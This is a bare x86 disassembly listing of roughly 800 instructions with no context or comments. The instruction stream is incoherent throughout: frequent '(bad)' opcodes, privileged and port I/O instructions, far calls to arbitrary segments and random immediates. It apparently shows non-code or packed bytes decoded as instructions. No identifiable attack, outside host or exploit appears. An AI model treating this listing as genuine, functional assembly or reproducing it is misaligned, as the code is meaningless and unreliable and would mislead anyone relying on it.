  48206e:	sbb    al,BYTE PTR [eax]
  482070:	sbb    eax,0xfea6556a
  482075:	add    BYTE PTR [ecx*1+0x7b010e01],cl
  48207c:	push   0x2e
  48207e:	js     0x482042
  482080:	adc    DWORD PTR [eax+0xd82bbb0],eax
  482086:	mov    esi,0x864dc201
  48208b:	cmp    esi,DWORD PTR [eax-0x4feef9f1]
  482091:	sbb    DWORD PTR [eax-0x2af65ede],esi
  482097:	add    al,dh
  482099:	sbb    eax,DWORD PTR [edx-0xdc]
  48209f:	aaa    
  4820a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4820a1:	and    eax,0x27b026b0
  4820a6:	mov    al,0x2f
  4820a8:	mov    al,0x0
  4820aa:	mov    ebp,0xbd02bd01
  4820af:	add    al,0xbd
  4820b1:	push   es
  4820b2:	mov    ebp,0xb033b02c
  4820b7:	xor    al,0xb0
  4820b9:	cmp    BYTE PTR [eax-0x27b07ec7],dh
  4820bf:	or     ebx,eax
  4820c1:	sbb    BYTE PTR [ebx],al
  4820c3:	mov    edx,0xf036ffec
  4820c8:	inc    DWORD PTR [ecx-0x3b003af2]
  4820ce:	inc    ebx
  4820d0:	inc    edx
  4820d2:	inc    ecx
  4820d4:	inc    eax
  4820d6:	test   BYTE PTR [edi-0x41c572f7],bh
  4820dc:	xchg   esi,eax
  4820dd:	std    
  4820de:	(bad)  
  4820df:	mov    ebp,0xbbffbcff
  4820e4:	or     DWORD PTR [ebp-0x2e1f6580],ecx
  4820ea:	push   0xfc3da7f9
  4820ef:	mov    edi,0xb7ffb88a
  4820f4:	push   DWORD PTR [esi-0x4b004a01]
  4820fa:	push   eax
  4820fc:	push   ebp
  4820fd:	jb     0x482156
  4820ff:	push   es
  482100:	jo     0x4820d1
  482102:	sar    DWORD PTR [esi+ebx*4-0x6c],cl
  482106:	in     al,0x4
  482108:	pop    eax
  482109:	and    al,0x48
  48210b:	ins    BYTE PTR es:[edi],dx
  48210c:	lahf   
  48210d:	out    0xf3,al
  48210f:	cmp    al,0x90
  482111:	mov    ah,0x3c
  482113:	pop    ecx
  482114:	cld    
  482115:	dec    esp
  482116:	pop    edx
  482117:	jns    0x482108
  482119:	repz xor al,0x80
  48211c:	xchg   esp,eax
  48211d:	sbb    al,0x63
  48211f:	dec    esi
  482120:	arpl   WORD PTR [esi+0x64],sp
  482123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  482124:	fnstcw WORD PTR [esi+ebx*8+0x6]
  482128:	enter  0x6598,0x40
  48212c:	pushaw 
  48212e:	frstor [edi+0xe94bcf9]
  482134:	mov    ah,0x8
  482136:	sub    al,0x4
  482139:	addr16 ds push ebp
  48213c:	fidivr WORD PTR [ebx-0x11]
  48213f:	push   ss
  482140:	or     BYTE PTR [esi],0xa4
  482143:	push   es
  482144:	mov    al,0xde
  482146:	(bad)  
  482147:	(bad)  
  482148:	aam    0x5b
  48214a:	out    dx,al
  48214b:	jge    0x4820eb
  48214d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48214e:	push   es
  48214f:	test   al,0xbc
  482151:	rol    BYTE PTR [eax-0x7b],1
  482154:	jbe    0x4821be
  482156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  482157:	loopne 0x482195
  482159:	iret   
  48215a:	repz push es
  48215c:	fsubr  st(4),st
  48215e:	in     al,dx
  48215f:	hlt    
  482160:	dec    edi
  482161:	repz mov ebp,0x65e2e13
  482167:	mov    esp,0xf86a380e
  48216c:	js     0x48215d
  48216e:	mov    ebp,0x16b83de7
  482173:	and    al,0xc4
  482175:	mov    dh,0x14
  482177:	dec    esi
  482178:	mov    BYTE PTR [esi],al
  48217a:	xchg   esp,eax
  48217b:	jns    0x48211b
  48217d:	idiv   BYTE PTR ds:0x6b882ef8
  482183:	push   es
  482184:	add    BYTE PTR [eax],cl
  482186:	adc    BYTE PTR [ecx-0x66],bh
  482189:	int    0xe7
  48218b:	sbb    BYTE PTR [eax],bh
  48218d:	ins    BYTE PTR es:[edi],dx
  48218e:	sbb    al,0x6d
  482190:	jo     0x48214e
  482192:	imul   BYTE PTR [ebp+edx*4-0xa]
  482196:	sbb    BYTE PTR [esi+0x36],ch
  482199:	je     0x4821e5
  48219b:	(bad)  
  48219c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48219d:	jb     0x4821ff
  48219f:	data16 int 0xf6
  4821a2:	imul   ecx,edi,0xa66261e0
  4821a8:	fcom   QWORD PTR [eax]
  4821aa:	xchg   BYTE PTR [esi],al
  4821ac:	xor    BYTE PTR [edi+0x40],bh
  4821af:	imul   DWORD PTR [ecx+0x36]
  4821b2:	fwait
  4821b3:	jne    0x482221
  4821b5:	outs   dx,DWORD PTR ds:[esi]
  4821b6:	int3   
  4821b7:	pop    edi
  4821b8:	shr    BYTE PTR [eax+0x5d],1
  4821bb:	fisub  DWORD PTR es:[edi+0x65eb4f9]
  4821c2:	or     al,0x7c
  4821c4:	pop    ebp
  4821c5:	pushf  
  4821c6:	and    BYTE PTR ds:0x69ef780e,bh
  4821cc:	fistp  QWORD PTR [ebx-0x80]
  4821cf:	es jo  0x482238
  4821d2:	add    al,0x7a
  4821d4:	push   esi
  4821d5:	xor    al,0x8c
  4821d7:	xchg   esi,eax
  4821d8:	je     0x482257
  4821da:	out    dx,eax
  4821db:	imul   esi,DWORD PTR [esi+0x6444a663],0x4c3ed828
  4821e5:	ss loopne 0x482259
  4821e8:	repz ds dec edi
  4821eb:	mov    bl,0x76
  4821ed:	mov    al,ds:0x18f4bc73
  4821f2:	je     0x482232
  4821f4:	js     0x4821d2
  4821f6:	and    al,0x56
  4821f8:	and    DWORD PTR [ebx-0x3f54df12],edx
  4821fe:	scas   al,BYTE PTR es:[edi]
  4821ff:	es pop es
  482201:	and    eax,0x13079089
  482206:	jo     0x4821fc
  482208:	or     ebx,DWORD PTR [edi]
  48220a:	pop    eax
  48220b:	aam    0x5e
  48220d:	mul    DWORD PTR [esi+0x1fd5043d]
  482213:	call   0xd04f124e
  482218:	cmp    DWORD PTR [eax],0xc
  48221b:	lods   al,BYTE PTR ds:[esi]
  48221c:	mov    dh,0x77
  48221e:	or     bh,cl
  482220:	mov    ds:0x86884718,al
  482225:	inc    ebx
  482226:	jmp    0x2487:0xcc070bec
  48222d:	pcmpeqd mm1,QWORD PTR [esi]
  482230:	push   es
  482231:	or     eax,DWORD PTR [edx+0x24]
  482234:	sub    eax,0xc1abc7f1
  482239:	and    DWORD PTR [edi+eax*1+0x4b3f1129],esi
  482240:	add    ecx,DWORD PTR [esi-0x38]
  482243:	js     0x48221a
  482245:	pusha  
  482246:	(bad)  
  482247:	pop    ss
  482248:	push   ss
  482249:	adc    BYTE PTR [esi],cl
  48224b:	add    al,0xdc
  48224d:	dec    esp
  48224e:	push   es
  48224f:	xlat   BYTE PTR ds:[ebx]
  482250:	add    al,0x78
  482252:	adc    BYTE PTR [edi+ebp*1-0x3c],bl
  482256:	nop
  482257:	div    DWORD PTR [eax+0x42]
  48225a:	dec    esi
  48225b:	add    DWORD PTR [eax-0x6f],esi
  48225e:	sbb    al,0x92
  482260:	enter  0xe045,0xcd
  482264:	mov    bh,0x50
  482266:	cs push cs
  482268:	inc    ebp
  482269:	ret    
  48226a:	(bad)  
  48226b:	out    0x9d,al
  48226d:	addr16 pusha 
  48226f:	(bad)  
  482270:	sub    DWORD PTR [esi-0x7f7e3fa4],eax
  482276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  482277:	lahf   
  482278:	xchg   ebx,eax
  482279:	pushf  
  48227a:	sbb    BYTE PTR [esi-0x2c],cl
  48227d:	(bad)  
  48227e:	mov    bh,0xe0
  482280:	xlat   BYTE PTR ds:[ebx]
  482281:	mov    ah,0x82
  482283:	sbb    dl,al
  482285:	jnp    0x48229d
  482287:	into   
  482288:	push   es
  482289:	sbb    bh,al
  48228b:	cmp    DWORD PTR ds:0x87d0a70d,eax
  482291:	mov    bh,0x3c
  482293:	mov    BYTE PTR [ebx+0xc089ded],bl
  482299:	mov    esi,esp
  48229b:	lea    eax,[esi]
  48229d:	mov    eax,0xef8ca08a
  4822a2:	xor    edi,0x26b4c834
  4822a8:	add    al,0x3b
  4822aa:	adc    dh,BYTE PTR [eax-0x73f4fce9]
  4822b0:	out    dx,eax
  4822b1:	mov    ebp,0x6a8a2a0
  4822b6:	and    BYTE PTR [edx-0x70],al
  4822b9:	lea    esp,[ebx]
  4822bb:	retf   
  4822bc:	stos   BYTE PTR es:[edi],al
  4822bd:	inc    ebx
  4822be:	or     cl,BYTE PTR [ecx+0x47d7e0ee]
  4822c4:	ror    DWORD PTR [esi],1
  4822c6:	imul   esp,DWORD PTR ds:0xafd65cc9,0x506e8150
  4822d0:	mov    eax,ds
  4822d2:	pop    ss
  4822d3:	aas    
  4822d4:	sub    BYTE PTR [edi],ch
  4822d6:	test   BYTE PTR [eax+0x10],ah
  4822d9:	lahf   
  4822da:	pushf  
  4822db:	gs sbb al,0x90
  4822de:	mov    al,0x5a
  4822e0:	mov    edx,0xb7239d47
  4822e5:	fwait
  4822e6:	out    0x3,al
  4822e8:	mov    dh,BYTE PTR [eax-0x5f744bf1]
  4822ee:	cdq    
  4822ef:	sub    eax,0x8d7441d
  4822f4:	sbb    DWORD PTR [ecx+eax*1],ecx
  4822f7:	sbb    DWORD PTR [eax-0x6cebd7ff],edx
  4822fd:	add    DWORD PTR [ecx],ebx
  4822ff:	nop
  482300:	sbb    BYTE PTR [eax],ah
  482302:	sbb    al,0x41
  482304:	push   cs
  482305:	dec    eax
  482306:	jl     0x4822cc
  482308:	mov    ds:0xef8c7034,al
  48230d:	pusha  
  48230e:	fs nop
  482310:	mov    WORD PTR [eax+ebx*8-0x13f91d5a],cs
  482317:	cmp    al,0xcf
  482319:	repz cmp al,0x5d
  48231c:	gs ins DWORD PTR es:[edi],dx
  48231e:	jne    0x4822a2
  482320:	repz cmp al,0xcf
  482323:	repz (bad) 
  482325:	pushf  
  482326:	test   eax,0x2317c3b6
  48232b:	into   
  48232c:	ret    
  48232d:	ror    BYTE PTR [esi],1
  48232f:	add    DWORD PTR [ecx-0x8],eax
  482332:	popf   
  482333:	sbb    DWORD PTR [edi+0x78],ebp
  482336:	cs je  0x482390
  482339:	pushf  
  48233a:	(bad)  [esi+0x6]
  48233d:	jne    0x482352
  48233f:	outs   dx,DWORD PTR ds:[esi]
  482340:	mov    BYTE PTR [ecx],al
  482342:	enter  0x7836,0x2f
  482346:	dec    edi
  482347:	repz sub eax,0xe69a4c4e
  48234d:	push   es
  48234e:	sbb    BYTE PTR [eax+ebp*1+0x59b3cde8],bl
  482355:	and    BYTE PTR [ebx+0x34a6f4e6],0xa9
  48235c:	stos   DWORD PTR es:[edi],eax
  48235d:	cmp    al,0xc3
  48235f:	push   cs
  482360:	cmp    al,0x9b
  482362:	mov    al,0xf0
  482364:	lods   eax,DWORD PTR ds:[esi]
  482365:	cwde   
  482366:	call   0x21:0x59ef43a7
  48236d:	jne    0x4823c3
  48236f:	ins    BYTE PTR es:[edi],dx
  482370:	sahf   
  482371:	and    dl,bl
  482373:	jbe    0x482376
  482375:	jb     0x482399
  482377:	and    dl,bl
  482379:	mov    ebp,0x7e9407ae
  48237e:	test   eax,0x8a900506
  482383:	adc    BYTE PTR [ebp-0xe78cafb],cl
  482389:	push   es
  48238a:	jmp    0x482393
  48238c:	(bad)  
  48238d:	fs push es
  48238f:	add    BYTE PTR [eax+0x5f99f8d1],dl
  482395:	lea    ebx,[ebp-0x4]
  482398:	mov    eax,ds:0xd9dd9844
  48239d:	inc    ecx
  48239e:	(bad)  
  48239f:	push   0xffffff90
  4823a1:	bound  ebx,QWORD PTR [ebx]
  4823a3:	or     BYTE PTR [esp+edx*1+0x49a840ea],0x2a
  4823ab:	adc    BYTE PTR [edx+0x314d6db0],0x6a
  4823b2:	lock adc eax,0xf26f630a
  4823b8:	inc    ecx
  4823b9:	mov    dh,0x74
  4823bb:	push   ds
  4823bc:	push   0xfffffff4
  4823be:	and    ecx,edi
  4823c0:	ins    DWORD PTR es:[edi],dx
  4823c1:	out    0x29,eax
  4823c3:	fistp  DWORD PTR [eax]
  4823c5:	and    eax,0x76198d5f
  4823ca:	aaa    
  4823cb:	adc    dh,dh
  4823cd:	add    eax,0x2d0e8ab2
  4823d2:	js     0x482396
  4823d4:	aam    0x40
  4823d6:	push   cs
  4823d7:	mov    al,0x35
  4823d9:	fsubr  QWORD PTR [edi+0x8046185]
  4823df:	inc    ebp
  4823e0:	mov    DWORD PTR ds:0x6f84a50b,0x1590a0c8
  4823ea:	fadd   QWORD PTR [ebx]
  4823ec:	push   ebx
  4823ed:	push   ecx
  4823ee:	xchg   BYTE PTR [bx+0x5153],dh
  4823f3:	test   DWORD PTR [edx-0x72],ebx
  4823f6:	lea    ebp,[edi+0x12]
  4823f9:	add    bl,BYTE PTR ds:0xea4de0e2
  4823ff:	inc    edx
  482400:	and    dl,BYTE PTR es:[ebx]
  482403:	jle    0x482418
  482405:	test   bl,ch
  482407:	cmc    
  482408:	mov    esp,0xae5a11b1
  48240d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48240e:	dec    esi
  48240f:	xor    BYTE PTR [edi+edi*8-0x3b259baf],ah
  482416:	and    ch,0x49
  482419:	jne    0x482459
  48241b:	sbb    BYTE PTR [eax],ch
  48241d:	loope  0x48245d
  48241f:	xor    al,0xa1
  482421:	mov    eax,0x85f736c
  482426:	ds clc 
  482428:	cwde   
  482429:	cmp    si,WORD PTR [ecx+0x75]
  48242d:	adc    al,BYTE PTR [ebx-0x77629797]
  482433:	adc    eax,DWORD PTR cs:[ecx+ecx*1]
  482437:	popf   
  482438:	retf   0x96ae
  48243b:	push   ds
  48243c:	mov    al,ds:0x675a98f0
  482441:	sbb    eax,0x8035207e
  482446:	jge    0x482463
  482448:	movups XMMWORD PTR [ecx+0x52],xmm2
  48244c:	pusha  
  48244d:	sbb    al,0x3c
  48244f:	sbb    BYTE PTR [edi+0x50c0b56],0xa8
  482456:	stos   DWORD PTR es:[edi],eax
  482457:	mov    cl,0x90
  482459:	(bad)  
  48245b:	fild   DWORD PTR [esi]
  48245d:	fiadd  WORD PTR [ecx-0x56f8d8f9]
  482463:	xor    eax,0x1fc23295
  482468:	or     DWORD PTR [esi],ebp
  48246a:	add    dh,ch
  48246c:	call   0xb10a:0x5742491f
  482473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  482474:	xor    eax,esi
  482476:	pop    ds
  482477:	xchg   esp,eax
  482478:	xor    al,0x76
  48247a:	shl    BYTE PTR [ecx+ebx*2+0x27088757],1
  482481:	push   ebx
  482482:	adc    BYTE PTR [edi-0x68],cl
  482485:	sbb    al,0x92
  482487:	das    
  482488:	push   edi
  482489:	push   ebx
  48248a:	inc    ebp
  48248b:	push   edi
  48248c:	inc    ebp
  48248d:	pop    esp
  48248e:	outs   dx,BYTE PTR ds:[esi]
  48248f:	pop    es
  482490:	das    
  482491:	daa    
  482492:	push   ebp
  482493:	jo     0x482498
  482495:	daa    
  482496:	or     ecx,DWORD PTR [eax+0x2c]
  482499:	pop    ss
  48249a:	pop    esp
  48249b:	add    al,0xf2
  48249d:	inc    edi
  48249e:	ins    BYTE PTR es:[edi],dx
  48249f:	popa   
  4824a0:	clts   
  4824a2:	add    cl,BYTE PTR [esi]
  4824a4:	in     al,dx
  4824a5:	add    DWORD PTR [eax],ecx
  4824a7:	xchg   edi,eax
  4824a8:	dec    esi
  4824a9:	outs   dx,DWORD PTR ds:[esi]
  4824aa:	test   ah,bh
  4824ac:	(bad)  [esi+0x48279748]
  4824b2:	push   ebx
  4824b3:	jo     0x482521
  4824b5:	imul   esi,DWORD PTR [esp+eax*1+0x22],0xbf56c81b
  4824bd:	sub    edx,DWORD PTR [edx-0x10]
  4824c0:	cmp    al,0x17
  4824c2:	mov    eax,ds:0x574cba0f
  4824c7:	mov    DWORD PTR [eax-0x2e],esp
  4824ca:	mov    ebp,0x4c75161
  4824cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4824d0:	sbb    al,BYTE PTR [ecx]
  4824d2:	or     cl,BYTE PTR [ebx]
  4824d4:	add    dh,BYTE PTR [ebx+0x0]
  4824d7:	add    eax,0x2f0ad2b6
  4824dc:	cmp    BYTE PTR [edi+0x6b5acd60],dh
  4824e2:	mov    al,ds:0xb6dab7b7
  4824e7:	pop    es
  4824e8:	enter  0xd1ef,0x6f
  4824ec:	daa    
  4824ed:	mov    ch,BYTE PTR ds:0x158292bd
  4824f3:	mov    ecx,0x60f76a54
  4824f8:	test   ch,dh
  4824fa:	fcomp  DWORD PTR [edi]
  4824fc:	sub    ebp,eax
  4824fe:	call   edx
  482500:	xchg   edi,eax
  482501:	sub    DWORD PTR [eax+edi*4-0x58],edi
  482505:	fld    QWORD PTR [edx-0x41]
  482508:	sbb    al,0xa4
  48250a:	rol    BYTE PTR [ebx+0xb],1
  48250d:	or     ebp,DWORD PTR [edi]
  48250f:	adc    BYTE PTR [edx+0x10eb3b42],bl
  482515:	inc    edx
  482516:	retf   
  482517:	push   ecx
  482518:	cdq    
  482519:	jmp    0xdfa75524
  48251e:	jl     0x482560
  482520:	pushf  
  482521:	inc    edx
  482522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  482523:	xchg   esp,ebp
  482525:	lea    edx,[ebx+0x44]
  482528:	sub    al,0xd8
  48252a:	add    eax,0xc1588755
  48252f:	cli    
  482530:	jno    0x4824d0
  482532:	nop
  482533:	dec    bl
  482535:	and    al,0xe4
  482537:	(bad)  
  482538:	mov    WORD PTR [esi-0x70],fs
  48253b:	inc    esp
  48253c:	imul   ebx,DWORD PTR [ebx+0x15],0x72
  482540:	push   ebp
  482541:	mov    al,0x76
  482543:	adc    DWORD PTR [ebx],edi
  482545:	inc    edx
  482546:	dec    esi
  482547:	mov    eax,ds:0xc6d61413
  48254c:	xchg   ebx,eax
  48254d:	xchg   esi,eax
  48254e:	loopne 0x482582
  482550:	mov    ds,esp
  482552:	sbb    esi,edx
  482554:	pop    ds
  482555:	out    dx,al
  482556:	sub    eax,0x710d2d75
  48255b:	(bad)  
  48255c:	mov    ah,0x51
  48255e:	retf   0x6dcd
  482561:	arpl   WORD PTR [edx-0xe],sp
  482564:	je     0x48257c
  482566:	mov    DWORD PTR ds:0xea26ba36,ebx
  48256c:	mov    ebx,DWORD PTR [ebx+0x30]
  48256f:	popa   
  482570:	cmp    BYTE PTR [edi-0x21cf2158],ch
  482576:	inc    esp
  482577:	add    DWORD PTR [edi],ecx
  482579:	mov    eax,0xc0c9103e
  48257e:	inc    ebx
  48257f:	pop    ebp
  482580:	fild   WORD PTR [ebx]
  482582:	push   cs
  482583:	(bad)  
  482584:	pusha  
  482585:	xor    bl,0x74
  482588:	pop    DWORD PTR [edi+ebx*8+0x25f5de42]
  48258f:	add    ebp,DWORD PTR [edi]
  482591:	push   esi
  482592:	xchg   edi,eax
  482593:	mov    esp,0x5f07a02d
  482598:	stc    
  482599:	mov    edx,0x4d138cab
  48259e:	out    dx,al
  48259f:	call   0x8116:0x6f1a8b15
  4825a6:	pop    ss
  4825a7:	imul   ebp,DWORD PTR [eax+0x4],0x4b70960f
  4825ae:	dec    edi
  4825af:	jne    0x4825ba
  4825b1:	call   esi
  4825b3:	inc    esi
  4825b4:	lock mov al,ds:0x7c08d49c
  4825ba:	shl    BYTE PTR ds:0x2422c18,cl
  4825c0:	jg     0x482634
  4825c2:	scas   eax,DWORD PTR es:[edi]
  4825c3:	in     al,dx
  4825c4:	mov    al,ds:0xd0f37cc1
  4825c9:	push   cs
  4825ca:	or     bl,BYTE PTR [ecx+0x60]
  4825cd:	inc    esp
  4825ce:	popf   
  4825cf:	mov    BYTE PTR [edi],cl
  4825d1:	mov    ecx,0xc61104f2
  4825d6:	inc    esp
  4825d7:	sbb    cl,BYTE PTR [edi-0x2ddda8bd]
  4825dd:	inc    ecx
  4825de:	xor    eax,0x808289f6
  4825e3:	(bad)  
  4825e4:	mov    WORD PTR [ebx],es
  4825e6:	add    cl,dh
  4825e8:	clc    
  4825e9:	pop    ecx
  4825ea:	lock out dx,al
  4825ec:	call   0xfed7:0x5804c678
  4825f3:	and    al,al
  4825f5:	jecxz  0x4825f9
  4825f7:	pop    ebx
  4825f8:	iret   
  4825f9:	dec    esp
  4825fa:	pushf  
  4825fb:	retf   
  4825fc:	mov    DWORD PTR [edx],esi
  4825fe:	add    BYTE PTR [ebp+0x30c92cc7],0x1c
  482605:	mov    DWORD PTR [ebp+0x59],ecx
  482608:	and    BYTE PTR [edi],bl
  48260a:	jo     0x4825a5
  48260c:	push   ss
  48260d:	xor    esp,ebp
  48260f:	xchg   edx,eax
  482610:	sbb    bh,BYTE PTR [edx-0x6bdeab33]
  482616:	cmc    
  482617:	imul   ebx,DWORD PTR [edx-0x17],0x29
  48261b:	xor    BYTE PTR [eax-0x41],dl
  48261e:	aas    
  48261f:	mov    al,ds:0xff2100d1
  482624:	cmp    DWORD PTR [ebp+0x48],ecx
  482627:	jne    0x48261a
  482629:	loope  0x48263b
  48262b:	or     DWORD PTR ds:0xeb388b9b,0x7a7a503d
  482635:	ins    DWORD PTR es:[edi],dx
  482636:	int    0xd0
  482638:	push   eax
  482639:	in     eax,0xb0
  48263b:	es call 0xd23:0xb15609b0
  482643:	push   0x6b6fee8d
  482648:	and    DWORD PTR [eax+edx*4],eax
  48264b:	push   esp
  48264c:	or     ch,BYTE PTR [edx+0x2]
  48264f:	push   esi
  482650:	dec    edi
  482651:	pop    eax
  482652:	mov    BYTE PTR [edx],ch
  482654:	mov    ds:0xc042125,eax
  482659:	sar    BYTE PTR [edx],cl
  48265b:	add    ch,ch
  48265d:	add    bh,BYTE PTR [edi+0x6d]
  482660:	call   0xc0c:0xada69a6
  482667:	adc    BYTE PTR [eax],dl
  482669:	adc    al,0x69
  48266b:	call   0x2018:0x181469a6
  482672:	and    BYTE PTR [esi+0x24a69a69],ah
  482678:	and    al,0x28
  48267a:	sub    BYTE PTR [eax+edx*4],ch
  48267d:	push   ebx
  48267e:	cli    
  48267f:	sub    DWORD PTR [edi+ebp*4],0x50
  482683:	push   0xa19de1e0
  482688:	and    eax,0xa5564038
  48268d:	pop    ss
  48268e:	mov    al,0xb5
  482690:	sbb    BYTE PTR [esi+0x29a902bf],dl
  482696:	sub    eax,0x8097d4f
  48269b:	test   DWORD PTR ds:0x21a21039,0xd0975b0
  4826a5:	nop
  4826a6:	push   ss
  4826a7:	mov    ds:0xda960f85,al
  4826ac:	mov    edi,0x6672dc9e
  4826b1:	push   0x27da7722
  4826b6:	and    cl,0xd4
  4826b9:	mov    edi,0x3d030eb0
  4826be:	cld    
  4826bf:	jg     0x4826d9
  4826c1:	je     0x482709
  4826c3:	sub    eax,0x3db8db00
  4826c8:	xchg   edi,eax
  4826c9:	jmp    0x3e74:0x308431b
  4826d0:	xor    eax,0xeeb69f8d
  4826d5:	shl    DWORD PTR [edx+ebp*1-0x43],1
  4826d9:	push   eax
  4826da:	dec    eax
  4826db:	je     0x4826d5
  4826dd:	xchg   ecx,eax
  4826de:	cmp    BYTE PTR [eax+0x16863409],bh
  4826e4:	clc    
  4826e5:	and    al,0xe0
  4826e7:	test   al,0xa4
  4826e9:	int3   
  4826ea:	mov    eax,ds:0xeb6d58cc
  4826ef:	ret    
  4826f0:	stc    
  4826f1:	sbb    al,0x58
  4826f3:	cwde   
  4826f4:	(bad)  
  4826f5:	(bad)  [eax+0x2]
  4826f8:	sbb    bh,cl
  4826fa:	outs   dx,DWORD PTR ds:[esi]
  4826fb:	push   0xebe8e110
  482700:	dec    edx
  482701:	mov    al,0x1
  482703:	inc    ecx
  482704:	mov    bl,0x5e
  482706:	les    esi,FWORD PTR [edi]
  482708:	jle    0x48271b
  48270a:	jne    0x482747
  48270c:	mov    eax,ds:0x4d0c93c4
  482711:	sub    al,0x7
  482713:	mov    dl,0xd0
  482715:	push   cs
  482716:	lods   al,BYTE PTR ds:[esi]
  482717:	(bad)  
  482718:	adc    DWORD PTR [edx+ecx*1+0x26],ebx
  48271c:	push   esi
  48271d:	sub    BYTE PTR [eax],cl
  48271f:	cmp    al,0x1d
  482721:	cmp    ecx,DWORD PTR [esi]
  482723:	shl    BYTE PTR [esi-0x2a],1
  482726:	xchg   bh,cl
  482728:	add    BYTE PTR [edi-0x2bcd6aba],dl
  48272e:	pop    edi
  48272f:	sub    DWORD PTR [eax],edx
  482731:	shl    BYTE PTR [eax-0x2ce9497a],0x7
  482738:	cmp    eax,0x2015487f
  48273d:	pushf  
  48273e:	mov    esp,ebp
  482740:	aas    
  482741:	xor    dh,BYTE PTR [esi+0x6b892bf]
  482747:	mov    ax,0xfff4
  48274b:	jmp    0x482751
  48274d:	or     dh,bl
  48274f:	jmp    FWORD PTR [ecx+eiz*1]
  482752:	xchg   DWORD PTR [edi+edx*2-0x70de5ec9],ebx
  482759:	outs   dx,BYTE PTR ds:[esi]
  48275a:	call   0xe25296ad
  48275f:	outs   dx,DWORD PTR ds:[esi]
  482760:	push   0x1e0c3205
  482765:	popa   
  482766:	and    DWORD PTR [edi],0xffffff88
  482769:	test   BYTE PTR [eax-0x6ecfe0ac],dl
  48276f:	rcl    BYTE PTR [edx-0x22a28680],0x24
  482776:	jno    0x4827b0
  482778:	xchg   ebp,eax
  482779:	nop
  48277a:	imul   ebp,edx,0xffffffc0
  48277d:	dec    eax
  48277e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48277f:	rcr    BYTE PTR [eax],1
  482781:	les    eax,FWORD PTR [edx+0x51]
  482784:	js     0x482796
  482786:	inc    esp
  482787:	jno    0x482749
  482789:	or     BYTE PTR [edi+edi*1+0x43893846],ah
  482790:	cmp    bh,ah
  482792:	mov    cl,0x88
  482794:	adc    DWORD PTR [edx+0x5],ebx
  482797:	inc    edi
  482798:	add    al,0x7
  48279a:	shr    BYTE PTR [edi+0x42],cl
  48279d:	mov    si,0x39dd
  4827a1:	xor    al,0x64
  4827a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4827a4:	fiadd  DWORD PTR [edi+ebx*1]
  4827a7:	pop    eax
  4827a8:	imul   edx,DWORD PTR [edx],0x78
  4827ab:	mov    bl,0xd8
  4827ad:	(bad)  
  4827ae:	fmul   DWORD PTR [eax]
  4827b0:	loopne 0x482827
  4827b2:	lods   al,BYTE PTR ds:[esi]
  4827b3:	inc    ebx
  4827b4:	dec    edx
  4827b5:	(bad)  
  4827b7:	lahf   
  4827b8:	xchg   BYTE PTR [edx+0x58],bl
  4827bb:	dec    edi
  4827bc:	iret   
  4827bd:	iret   
  4827be:	add    DWORD PTR [ebx+0x6f248086],ebp
  4827c4:	xor    al,0x34
  4827c6:	jmp    0x482808
  4827c8:	xchg   ebp,eax
  4827c9:	inc    eax
  4827ca:	push   esp
  4827cb:	push   es
  4827cc:	jp     0x48275b
  4827ce:	inc    ebp
  4827cf:	jecxz  0x48276a
  4827d1:	mov    eax,0x904cd420
  4827d6:	cmp    eax,0x1dff42cd
  4827db:	test   DWORD PTR [ebx+0x17],esi
  4827de:	adc    al,0xbb
  4827e0:	cmp    dl,BYTE PTR [esi]
  4827e2:	cmp    BYTE PTR [eax+0xf],ah
  4827e5:	aas    
  4827e6:	or     BYTE PTR [ebx+eax*4],cl
  4827e9:	loop   0x482833
  4827eb:	pop    ebx
  4827ec:	pop    es
  4827ed:	cmp    edx,DWORD PTR [esi+0x51136e9e]
  4827f3:	add    dl,dl
  4827f5:	dec    eax
  4827f6:	cmp    DWORD PTR [esi+0x4f],ecx
  4827f9:	or     al,0x19
  4827fb:	jae    0x48283d
  4827fd:	mov    edx,0x9c045128
  482802:	ret    
  482803:	(bad)  
  482804:	adc    ebx,DWORD PTR [eax-0x736f3ba3]
  48280a:	mov    edx,DWORD PTR [eax]
  48280c:	xchg   ebx,eax
  48280d:	arpl   WORD PTR ds:0x3503255c,di
  482813:	ja     0x482855
  482815:	push   edi
  482816:	fwait
  482817:	fs in  eax,0x55
  48281a:	adc    edx,edx
  48281c:	ins    BYTE PTR es:[edi],dx
  48281d:	cmp    BYTE PTR [edi+esi*1+0x481bda20],bh
  482824:	jl     0x4827b0
  482826:	push   eax
  482827:	push   esp
  482828:	mov    BYTE PTR [ebx-0xe],dl
  48282b:	pop    eax
  48282c:	mov    DWORD PTR [ebx+0x58],edx
  48282f:	push   ss
  482830:	ins    BYTE PTR es:[edi],dx
  482831:	test   DWORD PTR [edi],edx
  482833:	or     DWORD PTR [edx+0x6c],ebp
  482836:	sahf   
  482837:	inc    esp
  482838:	lea    edi,[ebx+0x44]
  48283b:	ins    DWORD PTR es:[edi],dx
  48283c:	imul   ebx,DWORD PTR [esi+0x5c162525],0x2540465c
  482846:	or     BYTE PTR [esi],bl
  482848:	add    eax,0x729f40f0
  48284d:	lds    ecx,FWORD PTR [edx+0x67bae7db]
  482853:	popa   
  482854:	in     eax,0x6a
  482856:	push   0xf5f08ad
  48285b:	enter  0xca18,0x17
  48285f:	inc    ebx
  482860:	stc    
  482861:	lock mov eax,ebx
  482864:	add    eax,DWORD PTR [ebx+0x5b22ab3]
  48286a:	test   BYTE PTR es:[ebx+0x502945a6],ch
  482871:	sbb    BYTE PTR [ecx+0x600d0488],cl
  482877:	arpl   WORD PTR [esi+0xc],bp
  48287a:	adc    DWORD PTR [ebp+0x8b2699f],ecx
  482880:	jle    0x482896
  482882:	dec    esi
  482883:	sbb    BYTE PTR [eax-0x10],bh
  482886:	pop    edx
  482887:	dec    esp
  482888:	push   cs
  482889:	sub    ecx,DWORD PTR [edx+edx*4+0x6974d488]
  482890:	pushf  
